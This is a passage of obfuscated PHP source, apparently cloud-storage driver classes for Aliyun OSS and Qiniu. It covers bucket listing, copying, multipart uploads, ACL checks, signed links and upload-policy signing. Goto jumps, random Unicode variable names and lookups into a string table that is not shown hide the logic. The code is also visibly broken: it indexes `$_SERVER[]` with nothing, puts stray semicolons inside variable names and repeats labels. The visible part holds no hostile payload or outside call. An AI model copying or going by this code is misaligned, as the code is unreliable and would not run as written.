LNG($DƑΦ[1269])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto Cù; A: $bӈۢ->addRule($f̸); try { $this->client->putBucketCors($this->bucket, $bӈۢ); } catch (OSS\Core\OssException $fȠ) { return !1; } return !0; goto cߡ糡; Cù: $Aۜ =& $_SERVER[]; $bӈۢ = new OSS\Model\CorsConfig(); $f̸ = new OSS\Model\CorsRule(); goto fܹ֙; C☪: $f̸->setMaxAgeSeconds(600); $f̸->addExposeHeader($Aۜ[1275]); $f̸->addAllowedHeader($Aۜ[1270]); goto A; c: $f̸->addAllowedMethod($Aۜ[1273]); $f̸->addAllowedMethod($Aۜ[1274]); $f̸->addAllowedMethod($Aۜ[158]); goto C☪; fܹ֙: $f̸->addAllowedOrigin($Aۜ[1270]); $f̸->addAllowedMethod($Aۜ[1271]); $f̸->addAllowedMethod($Aۜ[1272]); goto c; cߡ糡: } public function getBucketCors() { goto CॎԸ; CॎԸ: $b̨ =& $_SERVER[]; $B = null; try { $B = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $aȅ䋯) { return null; } goto bܐ; BȜ: return array($b̨[181] => isset($Døŭ[0]) ? $Døŭ[0] : $b̨[33], $b̨[185] => $B, $b̨[1276] => $Dɐ, $b̨[1277] => isset($Dí[0]) ? $Dí[0] : $b̨[33], $b̨[183] => isset($E鋾[0]) ? $E鋾[0] : $b̨[33]); goto Dɍ; Eػƣ: $Dɐ = $ëٰ́[0]->getMaxAgeSeconds(); $Dí = $ëٰ́[0]->getExposeHeaders(); $E鋾 = $ëٰ́[0]->getAllowedHeaders(); goto BȜ; bܐ: if (!$B || !($ëٰ́ = $B->getRules())) { return null; } $Døŭ = $ëٰ́[0]->getAllowedOrigins(); $B = $ëٰ́[0]->getAllowedMethods(); goto Eػƣ; Dɍ: } public function isBucketCors() { goto dК; fܬ: if ($E˰艎[$fϸ[181]] != $fϸ[182] || $E˰艎[$fϸ[183]] != $fϸ[182]) { return !1; } $b̛ = array_map($fϸ[184], $E˰艎[$fϸ[185]]); if (!is_array($b̛)) { $b̛ = array(); } goto Eǻ; Eǻ: $BǷ = array($fϸ[186], $fϸ[187], $fϸ[188], $fϸ[189], $fϸ[190]); $fᅗ = array_diff($BǷ, $b̛); return empty($fᅗ); goto a; dК: $fϸ =& $_SERVER[]; $E˰艎 = $this->getBucketCors(); if (!$E˰艎 || !is_array($E˰艎)) { return !1; } goto fܬ; a: } public function mkfile($f, $d̎焹 = '', $fӹ = REPEAT_RENAME) { $F = $this->setContent($f, $d̎焹); if ($F !== !1) { return $this->getPathOuter($f); } return !1; } public function mkdir($f, $e܃ߵ = REPEAT_SKIP) { if ($this->_isFolder($f)) { return $this->getPathOuter($f); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($f)); } catch (OSS\Core\OssException $Cߊ躇) { return !1; } return $this->getPathOuter($f); } private function fileList($bĒՋ, $FӉ = '', $dۮ = 0) { goto aк; aк: $Eۨ =& $_SERVER[]; $bĒՋ = trim($bĒՋ, $Eۨ[8]); $f = empty($bĒՋ) && $bĒՋ !== $Eۨ[191] ? $Eۨ[33] : $bĒՋ . $Eۨ[8]; goto dɌ; dɌ: $BР = $Eۨ[33]; $F = 1000; $A = $this->listItemCache === !1 ? !1 : !0; goto Cȃ; Aۯ: return array($Eۨ[75] => $Eڇ;, $Eۨ[74] => $a); goto Dżք; Cȃ: $Eڇ; = $a = array(); while (!0) { check_abort(); $c = array($Eۨ[1278] => $FӉ, $Eۨ[1279] => $f, $Eۨ[1280] => $F, $Eۨ[1281] => $BР); try { $Dɠ = $this->client->listObjects($this->bucket, $c); } catch (OSS\Core\OssException $e΃ݑ) { break; } $BР = $Dɠ->getNextMarker(); $D = $Dɠ->getObjectList(); $DÒ = $Dɠ->getPrefixList(); foreach ($D as $fꃹ) { goto b߈ت; b߈ت: if ($fꃹ->getKey() == $f) { continue; } $Eɋ = $fꃹ->getKey(); $b = $fꃹ->getSize(); goto D; D: $E = $fꃹ->getLastModified(); $DԡŅ = $dۮ ? array($Eۨ[28] => $Eɋ, $Eۨ[78] => $b, $Eۨ[197] => strtotime($E)) : $Eɋ; $C鶋Ԧ = $b == 0 && substr($Eɋ, strlen($Eɋ) - 1, 1) == $Eۨ[8] ? !0 : !1; goto f; f: if ($A) { $this->cacheMethod($Eۨ[199], $Eɋ, $C鶋Ԧ); $this->cacheMethod($Eۨ[200], $Eɋ, array($Eۨ[78] => $b, $Eۨ[1282] => $b, $Eۨ[84] => strtotime($E), $Eۨ[1283] => $E)); } if ($C鶋Ԧ) { $Eڇ;[] = $Eɋ; continue; } $a[] = $DԡŅ; goto D; D: } foreach ($DÒ as $fۅ) { $Eڇ;[] = $fۅ->getPrefix(); if ($A) { $this->cacheMethod($Eۨ[199], $Eɋ, !0); } } if ($BР === $Eۨ[33]) { break; } } if ($A) { $this->cacheMethod($Eۨ[199], $bĒՋ, !0); } goto Aۯ; Dżք: } public function copyFile($aü߮, $aР) { $Fدڹ = $this->size($aü߮); if ($Fدڹ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $aü߮, $this->bucket, $this->pathEncode($aР)); } catch (OSS\Core\OssException $aԂݠ) { return !1; } return $this->getPathOuter($aР); } $C = $this->multiCopyObject($aü߮, $aР, $Fدڹ); return $C ? $this->getPathOuter($aР) : !1; } private function multiCopyObject($a, $A嶇, $c) { $E =& $_SERVER[]; try { goto EߋǤ; A: $DБ = 1024 * 1024 * 10; $Cؐٲ = $this->client->generateMultiuploadParts($c, $DБ); foreach ($Cؐٲ as $Eί => $Fʐ٠) { $Eؑ = $C + (int) $Fʐ٠[$E[1285]]; $b = (int) $Fʐ٠[$E[335]] + $Eؑ - 1; $a = array($E[1286] => $Eؑ, $E[1287] => $b); $a񲝛[] = $this->client->uploadPartCopy($this->bucket, $a, $this->bucket, $this->pathEncode($A嶇), $D҃, $C񧎭, $a); $D҃ = $D҃ + 1; } goto a; BڌŌ: $D҃ = 1; $C = 0; $a񲝛 = array(); goto A; EߋǤ: $FĄǺ = array(); if ($Eфˆ = $this->hashMd5($a)) { $FĄǺ = array(OSS\OssClient::OSS_HEADERS => array($E[1284] => $Eфˆ)); } $C񧎭 = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($A嶇), $FĄǺ); goto BڌŌ; a: $C񍻨 = array(); foreach ($a񲝛 as $Eί => $DҢ) { $C񍻨[] = array($E[1288] => $Eί + 1, $E[1289] => $DҢ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($A嶇), $C񧎭, $C񍻨); goto CՋ; CՋ: } catch (OSS\Core\OssException $b) { return !1; } return !0; } public function moveFile($Fⅱ, $eˍ놄) { if ($this->copyFile($Fⅱ, $eˍ놄)) { $this->remove($Fⅱ); return $this->getPathOuter($eˍ놄); } return !1; } public function delFile($D) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($D)); } catch (OSS\Core\OssException $Eఇ) { return !1; } return !0; } public function delFolder($fɈʊ) { goto F܍; B: $AȏƔ = $this->delByBatch($D[$EƎ[75]]); if (!$AȏƔ) { return !1; } return $this->delFile($eؘ); goto f࿜Ĩې; e𢢅: if (!empty($fɈʊ) && $fɈʊ !== $EƎ[191] && !in_array($eؘ, $D[$EƎ[75]])) { $D[$EƎ[75]][] = $eؘ; } $AȏƔ = $this->delByBatch($D[$EƎ[74]]); if (!$AȏƔ) { return !1; } goto B; F܍: $EƎ =& $_SERVER[]; if (!$this->exist($fɈʊ)) { return !0; } $this->listItemCache = !1; goto bү; bү: $D = $this->fileList($fɈʊ); $this->listItemCache = !0; $eؘ = trim($fɈʊ, $EƎ[8]) . $EƎ[8]; goto e𢢅; f࿜Ĩې: } private function delByBatch($d좜¦) { foreach (array_chunk($d좜¦, 1000) as $F) { try { $this->client->deleteObjects($this->bucket, $F); } catch (OSS\Core\OssException $Aچɇ) { return !1; } } return !0; } public function rename($AĂ, $c݉) { return $this->renameObject($AĂ, $c݉); } private function fileInfo($BŤ, $e׿ = false, $D徂 = array()) { goto F; f琐: if (isset($D徂[$e֔؛ϓ[78]])) { $d뚙[$e֔؛ϓ[78]] = $D徂[$e֔؛ϓ[78]]; } if (isset($D徂[$e֔؛ϓ[84]])) { $d뚙[$e֔؛ϓ[84]] = $D徂[$e֔؛ϓ[84]]; } if (isset($D徂[$e֔؛ϓ[197]]) && !trim($d뚙[$e֔؛ϓ[84]])) { $d뚙[$e֔؛ϓ[84]] = $D徂[$e֔؛ϓ[197]]; } goto Dʜ; Dʜ: return $d뚙; goto b; F: $e֔؛ϓ =& $_SERVER[]; $d뚙 = array($e֔؛ϓ[28] => $this->pathThis($BŤ), $e֔؛ϓ[76] => $this->getPathOuter($BŤ), $e֔؛ϓ[29] => $e֔؛ϓ[193], $e֔؛ϓ[78] => isset($D徂[$e֔؛ϓ[78]]) ? $D徂[$e֔؛ϓ[78]] : 0, $e֔؛ϓ[168] => $this->ext($BŤ)); if ($e׿) { return $d뚙; } goto f輵; f輵: $d뚙[$e֔؛ϓ[194]] = $d뚙[$e֔؛ϓ[84]] = 0; $d뚙[$e֔؛ϓ[195]] = $d뚙[$e֔؛ϓ[196]] = !0; if (empty($D徂)) { $Dȫ = $this->objectMeta($BŤ); if (!$Dȫ) { return $d뚙; } $D徂 = array($e֔؛ϓ[84] => strtotime($Dȫ[$e֔؛ϓ[1283]]), $e֔؛ϓ[78] => $Dȫ[$e֔؛ϓ[1282]] + 0); } goto f琐; b: } private function folderInfo($aڅ, $d쇓ܑ = false, $eֈ݄ = array()) { goto C鄆; C鄆: $b܉ =& $_SERVER[]; $aƸ = array($b܉[28] => $this->pathThis($aڅ), $b܉[76] => $this->getPathOuter($b܉[8] . $aڅ), $b܉[29] => $b܉[77]); if ($d쇓ܑ) { return $aƸ; } goto e®ո; e®ո: $aƸ[$b܉[194]] = $aƸ[$b܉[84]] = 0; $aƸ[$b܉[195]] = $aƸ[$b܉[196]] = !0; if (empty($eֈ݄)) { $aڅ = rtrim($aڅ, $b܉[8]) . $b܉[8]; $ę = $this->objectMeta($aڅ); if (!$ę) { return $aƸ; } $eֈ݄ = array($b܉[194] => $ę[$b܉[1290]][$b܉[1291]], $b܉[84] => strtotime($ę[$b܉[1283]])); } goto c괥ʔ; c괥ʔ: if (isset($eֈ݄[$b܉[84]])) { $aƸ[$b܉[84]] = $eֈ݄[$b܉[84]]; } if (isset($eֈ݄[$b܉[194]])) { $aƸ[$b܉[194]] = $eֈ݄[$b܉[194]]; } return $aƸ; goto bߡ; bߡ: } public function listPath($A, $a֋ú = false) { $c =& $_SERVER[]; $DĦ = $this->fileList($A, $c[8], !0); foreach ($DĦ[$c[75]] as $BИΈ => $c) { $DĦ[$c[75]][$BИΈ] = $this->folderInfo($c, $a֋ú, $c); } foreach ($DĦ[$c[74]] as $BИΈ => $c) { $DĦ[$c[74]][$BИΈ] = $this->fileInfo($c[$c[28]], $a֋ú, $c); } return $DĦ; } public function has($dǩط, $Dꔍ = false, $E𕓲 = true) { goto bշ; F蠸: while (!0) { check_abort(); $Aܱ = array($cՉ[1278] => $cՉ[8], $cՉ[1279] => $b̈ˆ, $cՉ[1280] => $FӔʠ, $cՉ[1281] => $a); try { $d = $this->client->listObjects($this->bucket, $Aܱ); } catch (OSS\Core\OssException $D׻) { break; } $a = $d->getNextMarker(); $B = $d->getObjectList(); $dуƫ = $d->getPrefixList(); if ($Dꔍ) { if (count($B) > 1 || count($B) == 1 && $B[0]->getKey() != $b̈ˆ) { $A۳ւ += count($B) - 1; } if (!empty($dуƫ)) { $aօ += count($dуƫ); } if ($a === $cՉ[33]) { break; } continue; } if ($E𕓲) { if (!empty($B)) { if (count($B) > 1 || $B[0]->getKey() != $b̈ˆ) { return !0; } } } else { if (!empty($dуƫ)) { return !0; } } if ($a === $cՉ[33]) { break; } } if ($Dꔍ) { return array($cՉ[203] => $A۳ւ, $cՉ[204] => $aօ); } return !1; goto F; d쵃: $a = $cՉ[33]; $FӔʠ = 500; $A۳ւ = $aօ = 0; goto F蠸; bշ: $cՉ =& $_SERVER[]; $dǩط = trim($dǩط, $cՉ[8]); $b̈ˆ = empty($dǩط) && $dǩط !== $cՉ[191] ? $cՉ[33] : $dǩط . $cՉ[8]; goto d쵃; F: } public function listAll($Fゃ) { $e =& $_SERVER[]; $cز = $this->fileList($Fゃ, $e[33], !0); $D = array(); foreach ($cز[$e[74]] as $D) { $D[$D[$e[28]]] = $D[$e[78]]; } foreach ($cز[$e[75]] as $D) { if (is_string($D)) { $D[$D] = 0; } } return $this->listAllFiles($Fゃ, array_keys($D), $D); } public function canRead($eᑜ߳) { $dݼ =& $_SERVER[]; $Cť = $this->pathAcl($eᑜ߳); return $Cť == $dݼ[1292] || $Cť == $dݼ[519] ? !0 : !1; } public function canWrite($fت) { $Eǹ = $this->pathAcl($fت); return $Eǹ == $_SERVER[][519] ? !0 : !1; } public function pathAcl($D) { goto Cُ; b: $A = $b == $B宽[34] ? $this->bucketAcl : $b; if ($A == $B宽[1293]) { return $B宽[1292]; } if ($A == $B宽[1294]) { return $B宽[519]; } goto C׸; C׸: return $A; goto bڋռ; Cُ: $B宽 =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $b = $this->client->getObjectAcl($this->bucket, $this->pathEncode($D)); } catch (OSS\Core\OssException $cߺ) { return !1; } goto b; bڋռ: } private function chmodPath($E䐪, $C = '') { $eћȑ =& $_SERVER[]; $bӴ = empty($C) ? $eћȑ[1294] : $C; $eч = array($eћȑ[34], $eћȑ[192], $eћȑ[1293], $eћȑ[1294]); if (!in_array($bӴ, $eч)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($E䐪), $bӴ); } catch (OSS\Core\OssException $Dꎆ) { return !1; } return !0; } public function getContent($dܙ؊) { return $this->fileSubstr($dܙ؊, -1); } public function setContent($c, $aײҊ = '') { $cΉݕ =& $_SERVER[]; try { $C = $this->trafficLimit($cΉݕ[1295]); $FذŶ = $this->client->putObject($this->bucket, $this->pathEncode($c), $aײҊ, $C); } catch (OSS\Core\OssException $fޣʗ) { return !1; } $dشП = array($cΉݕ[1284] => trim($FذŶ[$cΉݕ[1296]], $cΉݕ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($c))); $this->updateObjMeta($c, $dشП); return isset($FذŶ[$cΉݕ[1297]][$cΉݕ[1243]]) ? !0 : !1; } private function updateObjMeta($e͎ꏷ, $Eೡ) { $e͎ꏷ = $this->pathEncode($e͎ꏷ); try { $b뵌 = array(OSS\OssClient::OSS_HEADERS => $Eೡ); $this->client->copyObject($this->bucket, $e͎ꏷ, $this->bucket, $e͎ꏷ, $b뵌); } catch (OSS\Core\OssException $D®∓) { return !1; } return !0; } public function upload($eލ̝, $d֩, $c͈㙉 = false, $Bų = REPEAT_REPLACE) { $Fܔ =& $_SERVER[]; $f㺎 = trim($eލ̝, $Fܔ[8]); $B벙 = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Fܔ[1284] => @md5_file($d֩)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eލ̝))); $B벙 = $this->trafficLimit($Fܔ[1295], $B벙); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($f㺎), $d֩, $B벙); } catch (OSS\Core\OssException $e) { return !1; } return $this->getPathOuter($eލ̝); } public function getHost() { $b =& $_SERVER[]; $Dߢ녘ɝ = explode($b[177], parent::getHost()); return $Dߢ녘ɝ[0] . $b[177] . $this->bucket . $b[95] . $Dߢ녘ɝ[1]; } public function uploadFormData($Bۅ, $C = 3600) { goto eӱګ; Cጃ: $cބ = base64_encode(hash_hmac($e[230], $aʢ݂, $this->secret, !0)); $c = array($e[1208] => $aʢ݂, $e[1301] => $this->accessKey, $e[1204] => $e[1196], $e[1302] => $cބ, $e[175] => $Dͯȶ); $c = $this->trafficLimit($e[1295], $c); goto E; E: return $c; goto aΒ; bď: $aͲҲ = date($e[1298], time() + $Aˮ); $F = new DateTime($aͲҲ); $c͖ŝ = $F->format(DateTime::ISO8601); goto cӢ; Cꯔ: $bү = $this->pathFather($Bۅ); $a纆 = array($e[1198] => $c͖ŝ, $e[1199] => array(array($e[1300], 0, $Aҷ), array($e[1202], $e[1203], $bү))); $aʢ݂ = base64_encode(json_encode($a纆)); goto Cጃ; cӢ: $B = strpos($c͖ŝ, $e[294]); $c͖ŝ = substr($c͖ŝ, 0, $B) . $e[1299]; $Aҷ = 1048576000 * 5; goto Cꯔ; eӱګ: $e =& $_SERVER[]; if (!($Dͯȶ = $this->getHost())) { return !1; } $Aˮ = $C; goto bď; aΒ: } public function multiUploadFormData($eר, $b = 3600) { $B =& $_SERVER[]; if (!($e윮 = $this->getHost())) { return !1; } $eꮮɒ = $this->trafficLimit($B[1295]); $Dݖ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($eר), $eꮮɒ); return array($B[221] => $Dݖ, $B[175] => $e윮 . $B[8] . $this->pathEncode($eר), $B[222] => gmdate($B[1303]), $B[93] => $eר); } public function multiUploadAuthData($Eꏼ, $eʪ = array()) { goto eۋ񜄘; eٶ: $f짲߯ = $Eꏼ; if (isset($eʪ[$FԵ٘[93]])) { $f짲߯ = $eʪ[$FԵ٘[93]]; unset($eʪ[$FԵ٘[93]]); } if (isset($eʪ[$FԵ٘[223]])) { $eʪ[$FԵ٘[222]] = $c; return $this->listUploadParts($f짲߯, $eʪ); } goto dڲ; dڲ: $d͠ = array($FԵ٘[224], $FԵ٘[33], $FԵ٘[119], $c, "\x78\x2d\x6f\163\x73\55\x64\x61\x74\145\x3a{$c}", $FԵ٘[8] . $this->bucket . $FԵ٘[8] . $f짲߯ . $ę); if (strpos($ę, $FԵ٘[225]) === 0) { $d͠[0] = $FԵ٘[226]; if ($F = $this->trafficLimit($FԵ٘[1295])) { $f짲߯ = $FԵ٘[1304]; array_splice($d͠, 5, 0, $f짲߯ . $FԵ٘[4] . $F[$f짲߯]); } } if (isset($eʪ[$FԵ٘[227]]) && $eʪ[$FԵ٘[227]] == $FԵ٘[228]) { $d͠[0] = $FԵ٘[228]; } goto aј; D: $b = $FԵ٘[1268] . $this->accessKey . $FԵ٘[4] . $B˅; if (strpos($ę, $FԵ٘[225]) === 0) { $b = array($FԵ٘[232] => $b, $FԵ٘[222] => $c); if ($F) { $b = array_merge($b, $F); } } return $b; goto EĚ졾; aј: if (!empty($eʪ[$FԵ٘[1305]])) { $FӞ = array_merge(array($d͠[4]), $eʪ[$FԵ٘[1305]]); sort($FӞ); $d͠[4] = implode($FԵ٘[229], $FӞ); } $Dݰ = implode($FԵ٘[229], $d͠); $B˅ = base64_encode(hash_hmac($FԵ٘[230], $Dݰ, $this->secret, !0)); goto D; eۋ񜄘: $FԵ٘ =& $_SERVER[]; $c = isset($eʪ[$FԵ٘[222]]) ? $eʪ[$FԵ٘[222]] : gmdate($FԵ٘[1303]); $ę = isset($eʪ[$FԵ٘[168]]) ? $eʪ[$FԵ٘[168]] : $FԵ٘[33]; goto eٶ; EĚ졾: } public function listUploadParts($fώ, $b˅) { goto F۵ѭ; C艎: $F׷Λ = $f츃->getListPart(); $E = array(); foreach ($F׷Λ as $Eɥʪ) { $E[] = array($E˓Ӝ[1288] => $Eɥʪ->getPartNumber(), $E˓Ӝ[1289] => trim($Eɥʪ->getETag(), $E˓Ӝ[116])); } goto c٩; c٩: unset($b˅[$E˓Ӝ[223]], $b˅[$E˓Ӝ[227]]); $eݷბ = $this->multiUploadAuthData($fώ, $b˅); if (empty($eݷბ)) { return !1; } goto C; C: return array($E˓Ӝ[232] => $eݷბ, $E˓Ӝ[222] => $b˅[$E˓Ӝ[222]], $E˓Ӝ[234] => $E); goto Aό; F۵ѭ: $E˓Ӝ =& $_SERVER[]; $E = parse_url_query($b˅[$E˓Ӝ[168]]); $f츃 = $this->client->listParts($this->bucket, $this->pathEncode($fώ), $E[$E˓Ӝ[221]]); goto C艎; Aό: } public function download($C, $Eܪ) { if ($this->isFolder($C)) { return !1; } try { $cڌ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Eܪ); $cڌ = $this->trafficLimit($_SERVER[][109], $cڌ); $this->client->getObject($this->bucket, $this->pathEncode($C), $cڌ); } catch (OSS\Core\OssException $F) { return !1; } return $Eܪ; } public function fileSubstr($F㩰, $C = 0, $e = false) { if ($C === -1) { $C = array(); } else { if ($e === !1) { $e = $this->size($F㩰); } else { $e = $C + $e - 1; } $C = array(OSS\OssClient::OSS_RANGE => "{$C}\55{$e}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($F㩰), $C); } catch (OSS\Core\OssException $c̉) { think_exception($c̉->getMessage()); return !1; } } private function trafficLimit($A۴, $DХ = array()) { goto fʖ; e쒃: return $DХ; goto d; fΏ: if (!$C) { return $DХ; } $C = $C < 819200 ? 819200 : ($C > 838860800 ? 838860800 : $C); $DХ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($C); goto e쒃; fʖ: $E䵲 =& $_SERVER[]; if ($A۴ == $E䵲[1295] && $this->isUploadServer() || $A۴ == $E䵲[109] && $this->isFileOutServer()) { return $DХ; } $C = floatval($GLOBALS[$E䵲[6]][$E䵲[88]][$E䵲[107]][$A۴]) * 1024 * 1024 * 8; goto fΏ; d: } public function link($E֞Ƙ, $b = array()) { $f =& $_SERVER[]; if (!$this->exist($E֞Ƙ) || $this->isFolder($E֞Ƙ)) { return !1; } try { $b = $this->trafficLimit($f[109], $b); $ẻ = $this->client->signUrl($this->bucket, $this->pathEncode($E֞Ƙ), 3600 * 12, $f[228], $b); return $this->getCdnLink($ẻ); } catch (OSS\Core\OssException $d䨎) { return !1; } } public function fileOut($f̿, $fÏ = false, $D؜ = false, $D܄ = '') { goto dĖؿ; dĖؿ: $F =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($f̿, $fÏ, $D؜, $D܄); } if (!$D؜) { $D؜ = $this->pathThis($f̿); } goto dɞ; dɞ: $D؜ = rawurlencode($D؜); $dό = get_file_mime(get_path_ext($D؜)); if ($dό == $F[213]) { return parent::fileOut($f̿, $fÏ, $D؜, $D܄); } goto A񠏍ƕ; CӸй: $D = $this->link($f̿, $F֊); $this->fileOutLink($D); goto eύ; A񠏍ƕ: $fÏ = $fÏ ? $F[214] : $F[215]; $F֊ = array(OSS\OssClient::OSS_SUB_RESOURCE => $F[1306] . rawurlencode("{$fÏ}\73\x66\x69\154\x65\x6e\x61\155\145\75{$D؜}")); $F֊[OSS\OssClient::OSS_SUB_RESOURCE] .= $F[1307] . rawurlencode($dό); goto CӸй; eύ: } public function fileOutServer($Eכ٠, $A͟ރ = false, $C = false, $C鳎 = '') { parent::fileOut($Eכ٠, $A͟ރ, $C, $C鳎); } public function fileOutImage($f, $bݵ = 250) { $E๘  = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1308] . $bݵ); $A߿ܙ = $this->link($f, $E๘ ); $this->fileOutLink($A߿ܙ); } public function fileOutImageServer($AۖÒ, $cੜ = 250) { parent::fileOutImage($AۖÒ, $cੜ); } public function fileOutLink($e) { $d =& $_SERVER[]; if (!$this->isCdnHost() && substr($e, 0, 7) == $d[1211]) { $e = $d[1212] . substr($e, 7); } header($d[159] . $e); die; } public function hashMd5($B؆Ύ, $b = '') { $C =& $_SERVER[]; $Cī = $this->_objectMeta($B؆Ύ); if (!$Cī) { return $C[33]; } if (!isset($Cī[$C[1284]]) && !empty($b)) { $cϜ = $this->updateObjMeta($B؆Ύ, array($C[1284] => $b)); $Cī[$C[1284]] = $cϜ ? $b : $C[33]; } return isset($Cī[$C[1284]]) ? strtolower($Cī[$C[1284]]) : $C[33]; } public function size($A듙) { $A렴 = $this->objectMeta($A듙); return $A렴 ? $A렴[$_SERVER[][78]] : 0; } public function info($F࿦) { if ($this->isFolder($F࿦)) { return $this->folderInfo($F࿦); } else { if ($this->isFile($F࿦)) { return $this->fileInfo($F࿦); } } return !1; } public function exist($fݻ) { return $this->isFile($fݻ) || $this->isFolder($fݻ); } public function isFile($Fߌ욑) { return !$this->isFolder($Fߌ욑) && $this->objectMeta($Fߌ욑); } public function isFolder($e) { return $this->cacheMethod($_SERVER[][199], $e); } protected function objectMeta($F) { return $this->cacheMethod($_SERVER[][200], $F); } protected function _objectMeta($F) { $c׆ =& $_SERVER[]; try { $fܕ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($F)); } catch (OSS\Core\OssException $e˜) { $fܕ = !1; } if ($fܕ) { $fܕ[$c׆[78]] = intval($fܕ[$c׆[1282]]); } return $fܕ; } protected function _isFolder($DÏ) { $f߉ԛ =& $_SERVER[]; if ($DÏ == $f߉ԛ[33] || $DÏ == $f߉ԛ[8]) { return !0; } $fǸ = array($f߉ԛ[1278] => $f߉ԛ[8], $f߉ԛ[1279] => rtrim($DÏ, $f߉ԛ[8]) . $f߉ԛ[8], $f߉ԛ[1280] => 1, $f߉ԛ[1281] => $f߉ԛ[33]); $D = $this->client->listObjects($this->bucket, $fǸ); if ($D->getObjectList() || $D->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($fͻ߭) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1309]; $this->_init($fͻ߭); } public function _init($c) { goto d˳; D⅊۹: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto Cſ; a: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto D⅊۹; d˳: $bŹ =& $_SERVER[]; foreach ($c as $e => $E) { if (isset($this->{$e})) { $this->{$e} = $E; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($bŹ[1310] . LNG($bŹ[1269])); } goto a; Cſ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($F՘բ, $d幵Ď = '', $Dϸ = REPEAT_RENAME) { if ($this->setContent($F՘բ, $d幵Ď)) { return $this->getPathOuter($F՘բ); } return !1; } public function mkdir($bܡ, $cÙ = REPEAT_SKIP) { goto D; E: $bܡ = $D . $E[8]; $C֕ = get_path_this($D); $b = $bܡ . $C֕; goto B; D: $E =& $_SERVER[]; $D = trim($bܡ, $E[8]); if ($this->_isFolder($D)) { return $this->getPathOuter($D); } goto E; B: if (!$this->mkfile($b)) { return !1; } if (!$this->moveFile($b, $bܡ)) { $this->delFile($b); return !1; } return $this->getPathOuter($D); goto C勘; C勘: } public function copyFile($fӖ, $a) { $cѢ = $this->bucketManager->copy($this->bucket, $fӖ, $this->bucket, $a, !0); return $cѢ ? !1 : $this->getPathOuter($a); } public function moveFile($C߲Ц޵, $Bܶ) { $A = $this->bucketManager->move($this->bucket, $C߲Ц޵, $this->bucket, $Bܶ, !0); return $A ? !1 : $this->getPathOuter($Bܶ); } public function delFile($A) { if (!$this->exist($A)) { return !0; } $Cҧ = $this->bucketManager->delete($this->bucket, $A); return $Cҧ ? !1 : !0; } public function delFolder($DČ) { goto f⋄; fŴ: if (!empty($DČ) && $DČ !== $B옣[191] && !in_array($Eɺ, $Aݻ߂[$B옣[75]])) { $Aݻ߂[$B옣[75]][] = $Eɺ; } $F᷊ = $this->delByBatch($Aݻ߂[$B옣[74]]); if (!$F᷊) { return !1; } goto aϏ; aϏ: $F᷊ = $this->delByBatch($Aݻ߂[$B옣[75]]); if (!$F᷊) { return !1; } return $this->delFile($Eɺ); goto F뿿; f⋄: $B옣 =& $_SERVER[]; if (!$this->exist($DČ)) { return !0; } $this->listItemCache = !1; goto D⋙; D⋙: $Aݻ߂ = $this->fileList($DČ); $this->listItemCache = !0; $Eɺ = trim($DČ, $B옣[8]) . $B옣[8]; goto fŴ; F뿿: } private function delByBatch($B뉆) { foreach (array_chunk($B뉆, 1000) as $b͝) { $BېҊ = $this->bucketManager->buildBatchDelete($this->bucket, $b͝); list($d䧏ݚ, $e) = $this->bucketManager->batch($BېҊ); if ($e) { return !1; } } return !0; } public function rename($Eƪ, $d薐) { return $this->renameObject($Eƪ, $d薐); } public function fileInfo($Eܟ, $Fȅ֓Λ = false, $dڌ = array()) { goto Aű; Aű: $F譇҅ =& $_SERVER[]; $BН = array($F譇҅[28] => $this->pathThis($Eܟ), $F譇҅[76] => $this->getPathOuter($F譇҅[8] . $Eܟ), $F譇҅[29] => $F譇҅[193], $F譇҅[78] => isset($dڌ[$F譇҅[1311]]) ? $dڌ[$F譇҅[1311]] : 0, $F譇҅[168] => $this->ext($Eܟ)); if ($Fȅ֓Λ) { return $BН; } goto cԒ; a: if (isset($dڌ[$F譇҅[1312]])) { $BН[$F譇҅[84]] = substr($dڌ[$F譇҅[1312]] . $F譇҅[33], 0, 10); } if (isset($dڌ[$F譇҅[1311]])) { $BН[$F譇҅[78]] = $dڌ[$F譇҅[1311]]; } return $BН; goto b; cԒ: $BН[$F譇҅[194]] = $BН[$F譇҅[84]] = 0; $BН[$F譇҅[195]] = $BН[$F譇҅[196]] = !0; if (empty($dڌ)) { $dڌ = $this->objectMeta($Eܟ); if (!$dڌ) { return $BН; } } goto a; b: } public function folderInfo($dߺǆ, $A = false) { goto aؚ; FԌ: $D = $this->objectMeta($dߺǆ); if (isset($D[$dؓ[1312]])) { $e[$dؓ[84]] = substr($D[$dؓ[1312]] . 